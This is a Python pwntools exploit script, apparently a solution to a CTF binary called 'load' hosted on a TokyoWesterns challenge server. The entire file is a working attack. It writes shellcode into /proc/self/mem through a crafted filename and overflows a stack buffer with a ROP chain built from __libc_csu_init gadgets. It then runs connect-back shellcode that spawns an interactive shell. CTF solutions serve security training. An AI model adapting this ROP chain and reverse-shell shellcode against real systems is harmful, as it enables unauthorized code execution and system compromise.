#!/usr/bin/env python
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py

bin_file = './load'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'pwn1.chal.ctf.westerns.tokyo', 'port':34835})
env.set_item('local',   debug   = {'host':'localhost', 'port':4296}, \
                        local   = {'host':'localhost', 'port':4296}, \
                        remote  = {'host':'localhost', 'port':4296})
env.select()

#==========

binf = ELF(bin_file)
addr_bss            = binf.sep_section['.bss']
addr_fname          = addr_bss + 0x20
addr_buf            = addr_bss + 0x100

addr_plt_open       = binf.plt['open']
addr_plt_printf     = binf.plt['__printf_chk']
addr_got_lseek      = binf.got['lseek']

addr_csu_init       = 0x00400a10
addr_csu_init_1     = addr_csu_init + 0x5a
addr_csu_init_2     = addr_csu_init + 0x40

addr_ret            = 0x004006a9
addr_pop_rdi        = 0x00400a73
addr_pop_rsi_r15    = 0x00400a71

addr_shellcode      = 0x00400b00

#==========

def attack(conn, pconn):
    shellcode2  = shellcraft.dup2(2, 0)
    shellcode2 += shellcraft.dup2(2, 1)
    shellcode2 += shellcraft.sh()
    shellcode2  = '\x01'+asm(shellcode2)

    shellcode  = shellcraft.connect(env.local['host'], env.local['port'])
    shellcode += shellcraft.read(2, addr_buf, len(shellcode2))
    shellcode += shellcraft.write(1, addr_buf, None)

    fname  = '/proc/self/fd/0\x00'
    fname += '/proc/self/mem\x00'
    fname += asm(shellcode)
    conn.sendlineafter('name: ', fname)
    conn.sendlineafter('offset: ', '0')

    exploit  = 'a'*0x30
    exploit += p64(0xdeadbeef) 

    exploit += p64(addr_pop_rdi)
    exploit += p64(addr_fname + 0x10)
    exploit += p64(addr_pop_rsi_r15)
    exploit += p64(1)
    exploit += p64(0xcafebabe) 
    exploit += p64(addr_plt_open)
    exploit += p64(addr_plt_open)

    exploit += p64(addr_csu_init_1)
    exploit += p64(0)
    exploit += p64(1)
    exploit += p64(addr_got_lseek)
    exploit += p64(0)
    exploit += p64(addr_shellcode)
    exploit += p64(1)
    exploit += p64(addr_csu_init_2)

    exploit += p64(0xcafebabe)*7

    exploit += p64(addr_pop_rdi)
    exploit += p64(1)
    exploit += p64(addr_pop_rsi_r15)
    exploit += p64(addr_fname + 0x1f)
    exploit += p64(0xcafebabe) 
    exploit += p64(addr_plt_printf)
    exploit += p64(addr_shellcode)

    conn.sendlineafter('size: ', str(len(exploit)))
    conn.send(exploit)

    pconn.wait_for_connection()
    pconn.send(shellcode2)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    pcon = listen(4296)
    attack(conn, pcon)
    pcon.interactive()
    
#==========
